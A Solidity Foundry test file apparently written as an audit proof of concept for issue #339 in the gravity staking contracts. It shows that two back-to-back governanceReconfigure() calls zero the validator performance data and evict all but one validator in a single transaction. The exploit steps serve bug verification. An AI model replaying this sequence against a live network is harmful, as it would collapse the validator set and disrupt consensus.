// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import { Test } from "forge-std/Test.sol";

import { Reconfiguration } from "@gravity/blocker/Reconfiguration.sol";
import { ValidatorPerformanceTracker } from "@gravity/blocker/ValidatorPerformanceTracker.sol";

import { ValidatorManagement } from "@gravity/staking/ValidatorManagement.sol";
import { GenesisValidator } from "@gravity/staking/IValidatorManagement.sol";

import { Timestamp } from "@gravity/runtime/Timestamp.sol";
import { EpochConfig } from "@gravity/runtime/EpochConfig.sol";
import { StakingConfig } from "@gravity/runtime/StakingConfig.sol";
import { ValidatorConfig } from "@gravity/runtime/ValidatorConfig.sol";
import { RandomnessConfig } from "@gravity/runtime/RandomnessConfig.sol";
import { ConsensusConfig } from "@gravity/runtime/ConsensusConfig.sol";
import { ExecutionConfig } from "@gravity/runtime/ExecutionConfig.sol";
import { GovernanceConfig } from "@gravity/runtime/GovernanceConfig.sol";
import { VersionConfig } from "@gravity/runtime/VersionConfig.sol";
import { DKG } from "@gravity/runtime/DKG.sol";

import { ValidatorStatus } from "@gravity/foundation/Types.sol";
import { SystemAddresses } from "@gravity/foundation/SystemAddresses.sol";

import { MockStaking } from "../src/MockStaking.sol";

/// @title PoC for gravity-audit issue #339 (OPEN + High, live-bug verification)
/// @notice "Double governanceReconfigure() in governance batch causes mass validator eviction
///          via zero-performance data".
///
/// @dev Also covers the same root cause referenced by issues #462, #473, #357
///      (`governanceReconfigure` lacking guards / dedup against same-tx replay).
///
/// Exploit chain (condensed from issue body + static verdict):
///   1. Governance.execute(targets, datas) loops with no dedup over targets — the same
///      governanceReconfigure() can be listed twice in one batch.
///   2. governanceReconfigure() only blocks if _transitionState == DkgInProgress. With DKG
///      Off, the call runs synchronously and ends with _transitionState = Idle — so the
///      second call passes the guard.
///   3. _applyReconfiguration calls PerformanceTracker.onNewEpoch(activeCount) which pops
///      every existing performance entry and pushes fresh zero-valued entries sized to the
///      current active set. After call #1, every active validator has perf = (0,0).
///   4. The SECOND governanceReconfigure() then calls evictUnderperformingValidators().
///      Phase 2 reads getAllPerformances(), sees `total == 0` for every validator, and
///      hits the unconditional shouldEvict branch (no threshold needed).
///   5. Every validator except the last (liveness guard at line 712-715) is set to
///      PENDING_INACTIVE. _applyReconfiguration → onNewEpoch → _applyDeactivations then
///      promotes all of them to INACTIVE — collapsing the active set to 1 in one tx.
///
/// PoC polarity: `test_attackSucceedsIfVulnerable` is expected to PASS on vulnerable code
/// (current main `a623eab`).
contract POC_339 is Test {
    // System contracts (typed handles at canonical SystemAddresses)
    Timestamp internal timestamp;
    EpochConfig internal epochConfig;
    StakingConfig internal stakingConfig;
    ValidatorConfig internal validatorConfig;
    RandomnessConfig internal randomnessConfig;
    ConsensusConfig internal consensusConfig;
    ExecutionConfig internal executionConfig;
    GovernanceConfig internal governanceConfig;
    VersionConfig internal versionConfig;
    DKG internal dkg;
    Reconfiguration internal reconfiguration;
    ValidatorPerformanceTracker internal perfTracker;
    ValidatorManagement internal validatorManagement;

    MockStaking internal mockStaking;

    // Test parameters
    uint256 internal constant N_VALIDATORS = 4;
    uint256 internal constant MIN_BOND = 10 ether;
    uint256 internal constant MAX_BOND = 1000 ether;
    uint256 internal constant POOL_POWER = 100 ether; // safely above minimumBond
    uint64 internal constant EPOCH_INTERVAL = uint64(2 hours) * 1_000_000;
    uint64 internal constant LOCKUP_DURATION = uint64(14 days) * 1_000_000;
    uint64 internal constant UNBONDING_DELAY = uint64(7 days) * 1_000_000;
    uint64 internal constant INITIAL_TIMESTAMP = 1_000_000_000_000_000;

    // BLS-shaped bytes (length validation only — genesis path skips PoP precompile)
    bytes internal constant CONSENSUS_POP = hex"abcdef1234567890";
    bytes internal constant NETWORK_ADDR = hex"0102030405060708";
    bytes internal constant FULLNODE_ADDR = hex"0807060504030201";

    address[N_VALIDATORS] internal pools;

    // ------------------------------------------------------------------------
    // setUp: deploy & wire all system contracts at canonical addresses, then
    // boot N validators directly into ACTIVE via ValidatorManagement.initialize.
    // ------------------------------------------------------------------------
    function setUp() public {
        // 1. Etch implementations at SystemAddresses
        vm.etch(SystemAddresses.TIMESTAMP, address(new Timestamp()).code);
        vm.etch(SystemAddresses.EPOCH_CONFIG, address(new EpochConfig()).code);
        vm.etch(SystemAddresses.STAKE_CONFIG, address(new StakingConfig()).code);
        vm.etch(SystemAddresses.VALIDATOR_CONFIG, address(new ValidatorConfig()).code);
        vm.etch(SystemAddresses.RANDOMNESS_CONFIG, address(new RandomnessConfig()).code);
        vm.etch(SystemAddresses.CONSENSUS_CONFIG, address(new ConsensusConfig()).code);
        vm.etch(SystemAddresses.EXECUTION_CONFIG, address(new ExecutionConfig()).code);
        vm.etch(SystemAddresses.GOVERNANCE_CONFIG, address(new GovernanceConfig()).code);
        vm.etch(SystemAddresses.VERSION_CONFIG, address(new VersionConfig()).code);
        vm.etch(SystemAddresses.DKG, address(new DKG()).code);
        vm.etch(SystemAddresses.RECONFIGURATION, address(new Reconfiguration()).code);
        vm.etch(SystemAddresses.PERFORMANCE_TRACKER, address(new ValidatorPerformanceTracker()).code);
        vm.etch(SystemAddresses.VALIDATOR_MANAGER, address(new ValidatorManagement()).code);

        // 2. Mock Staking at SystemAddresses.STAKING (real Staking + StakePools would be
        //    a 4× pool deploy with lockup wiring; for the eviction path we only need
        //    getPoolVotingPower + renewPoolLockup).
        mockStaking = new MockStaking(POOL_POWER);
        vm.etch(SystemAddresses.STAKING, address(mockStaking).code);
        // Re-bind handle for typed calls (vm.etch only copies bytecode, not storage)
        mockStaking = MockStaking(SystemAddresses.STAKING);
        // Seed mock storage so getPoolVotingPower returns POOL_POWER for any pool
        // (the etched code reads from the etched-address's storage, which is empty;
        // we set defaultVotingPower via the constructor of a fresh MockStaking and
        // copy the *runtime bytecode* — so we need to set storage at the etched addr).
        // Easiest: write directly to storage slot 0 (defaultVotingPower).
        vm.store(SystemAddresses.STAKING, bytes32(uint256(0)), bytes32(POOL_POWER));

        // 3. Bind typed handles
        timestamp = Timestamp(SystemAddresses.TIMESTAMP);
        epochConfig = EpochConfig(SystemAddresses.EPOCH_CONFIG);
        stakingConfig = StakingConfig(SystemAddresses.STAKE_CONFIG);
        validatorConfig = ValidatorConfig(SystemAddresses.VALIDATOR_CONFIG);
        randomnessConfig = RandomnessConfig(SystemAddresses.RANDOMNESS_CONFIG);
        consensusConfig = ConsensusConfig(SystemAddresses.CONSENSUS_CONFIG);
        executionConfig = ExecutionConfig(SystemAddresses.EXECUTION_CONFIG);
        governanceConfig = GovernanceConfig(SystemAddresses.GOVERNANCE_CONFIG);
        versionConfig = VersionConfig(SystemAddresses.VERSION_CONFIG);
        dkg = DKG(SystemAddresses.DKG);
        reconfiguration = Reconfiguration(SystemAddresses.RECONFIGURATION);
        perfTracker = ValidatorPerformanceTracker(SystemAddresses.PERFORMANCE_TRACKER);
        validatorManagement = ValidatorManagement(SystemAddresses.VALIDATOR_MANAGER);

        // 4. Set initial time
        address timeWriter = makeAddr("timeWriter");
        vm.prank(SystemAddresses.BLOCK);
        timestamp.updateGlobalTime(timeWriter, INITIAL_TIMESTAMP);

        // 5. Initialize all configs from GENESIS
        vm.prank(SystemAddresses.GENESIS);
        epochConfig.initialize(EPOCH_INTERVAL);

        vm.prank(SystemAddresses.GENESIS);
        stakingConfig.initialize(MIN_BOND, LOCKUP_DURATION, UNBONDING_DELAY);

        // ValidatorConfig: autoEvictEnabled=true, threshold doesn't matter (the total==0
        // branch in evictUnderperformingValidators is unconditional), but use 50 for realism.
        vm.prank(SystemAddresses.GENESIS);
        validatorConfig.initialize(
            MIN_BOND, MAX_BOND, UNBONDING_DELAY, true /*allowSetChange*/, 20 /*votingPowerIncreaseLimitPct*/,
            100 /*maxValidatorSetSize*/, true /*autoEvictEnabled*/, 50 /*autoEvictThresholdPct*/
        );

        // RandomnessConfig: variant=Off so governanceReconfigure() takes the immediate path
        RandomnessConfig.RandomnessConfigData memory offConfig =
            RandomnessConfig.RandomnessConfigData({
                variant: RandomnessConfig.ConfigVariant.Off,
                configV2: RandomnessConfig.ConfigV2Data(0, 0, 0)
            });
        vm.prank(SystemAddresses.GENESIS);
        randomnessConfig.initialize(offConfig);

        vm.prank(SystemAddresses.GENESIS);
        consensusConfig.initialize(hex"01");

        vm.prank(SystemAddresses.GENESIS);
        executionConfig.initialize(hex"01");

        vm.prank(SystemAddresses.GENESIS);
        governanceConfig.initialize(1 ether, 1 ether, uint64(1 hours) * 1_000_000);

        vm.prank(SystemAddresses.GENESIS);
        versionConfig.initialize(1);

        // 6. Bootstrap N genesis validators directly to ACTIVE
        GenesisValidator[] memory gvs = new GenesisValidator[](N_VALIDATORS);
        for (uint256 i = 0; i < N_VALIDATORS; i++) {
            address pool = address(uint160(0xA000 + i));
            pools[i] = pool;
            // Build 48-byte unique pubkey (BLS12-381 G1 compressed length)
            bytes memory pk = abi.encodePacked(pool, bytes28(keccak256(abi.encodePacked(pool, i))));
            gvs[i] = GenesisValidator({
                stakePool: pool,
                moniker: string(abi.encodePacked("v", vm.toString(i))),
                consensusPubkey: pk,
                consensusPop: CONSENSUS_POP,
                networkAddresses: NETWORK_ADDR,
                fullnodeAddresses: FULLNODE_ADDR,
                feeRecipient: pool,
                votingPower: POOL_POWER
            });
        }
        vm.prank(SystemAddresses.GENESIS);
        validatorManagement.initialize(gvs);

        // 7. Initialize PerformanceTracker with the same number of slots
        vm.prank(SystemAddresses.GENESIS);
        perfTracker.initialize(N_VALIDATORS);

        // 8. Initialize Reconfiguration LAST (it reads timestamp + sets currentEpoch=1)
        vm.prank(SystemAddresses.GENESIS);
        reconfiguration.initialize();

        // Sanity: 4 ACTIVE validators, currentEpoch=1
        assertEq(validatorManagement.getActiveValidatorCount(), N_VALIDATORS, "sanity: 4 active validators");
        assertEq(reconfiguration.currentEpoch(), 1, "sanity: epoch starts at 1");
        for (uint256 i = 0; i < N_VALIDATORS; i++) {
            assertEq(
                uint8(validatorManagement.getValidatorStatus(pools[i])),
                uint8(ValidatorStatus.ACTIVE),
                "sanity: validator ACTIVE pre-attack"
            );
        }
    }

    // ------------------------------------------------------------------------
    // Attack: emulate Governance.execute([gov, gov], [reconfigure, reconfigure])
    // by pranking GOVERNANCE and calling governanceReconfigure() back-to-back.
    // ------------------------------------------------------------------------
    function test_attackSucceedsIfVulnerable() public {
        // FIRST CALL — bumps currentEpoch from 1 → 2 (so the closingEpoch <= 1
        // skip-guard is bypassed for the second call), and resets PerformanceTracker
        // to all-zero entries sized to the current active set.
        vm.prank(SystemAddresses.GOVERNANCE);
        reconfiguration.governanceReconfigure();

        assertEq(
            reconfiguration.currentEpoch(), 2, "after 1st reconfigure: epoch=2 (eviction Phase 2 unlocked)"
        );
        assertEq(
            validatorManagement.getActiveValidatorCount(),
            N_VALIDATORS,
            "after 1st reconfigure: still 4 active (perf was non-empty pre-reset, no evictions yet)"
        );
        // After call #1, _transitionState is Idle again — so the second call passes the
        // DkgInProgress guard, and the perf tracker now holds N_VALIDATORS zero entries.

        // SECOND CALL — now evictUnderperformingValidators() reads (0,0) for every
        // validator → total == 0 branch → all but the last marked PENDING_INACTIVE
        // → onNewEpoch → _applyDeactivations → INACTIVE.
        vm.prank(SystemAddresses.GOVERNANCE);
        reconfiguration.governanceReconfigure();

        // ---- POST-EXPLOIT ASSERTIONS ----

        // The active set has collapsed to 1.
        uint256 activeCount = validatorManagement.getActiveValidatorCount();
        assertEq(activeCount, 1, "EXPLOIT CONFIRMED: active set collapsed to 1 validator");

        // Count INACTIVE statuses across the original validator set.
        uint256 inactiveCount = 0;
        uint256 stillActive = 0;
        for (uint256 i = 0; i < N_VALIDATORS; i++) {
            ValidatorStatus s = validatorManagement.getValidatorStatus(pools[i]);
            if (s == ValidatorStatus.INACTIVE) inactiveCount++;
            else if (s == ValidatorStatus.ACTIVE) stillActive++;
        }
        assertEq(stillActive, 1, "exactly one validator survives (liveness guard)");
        assertEq(
            inactiveCount,
            N_VALIDATORS - 1,
            "EXPLOIT CONFIRMED: all-but-one validators demoted to INACTIVE in a single tx"
        );

        // Total voting power is now just the surviving validator's power.
        assertEq(
            validatorManagement.getTotalVotingPower(),
            POOL_POWER,
            "totalVotingPower collapsed to single surviving validator's power"
        );
    }
}
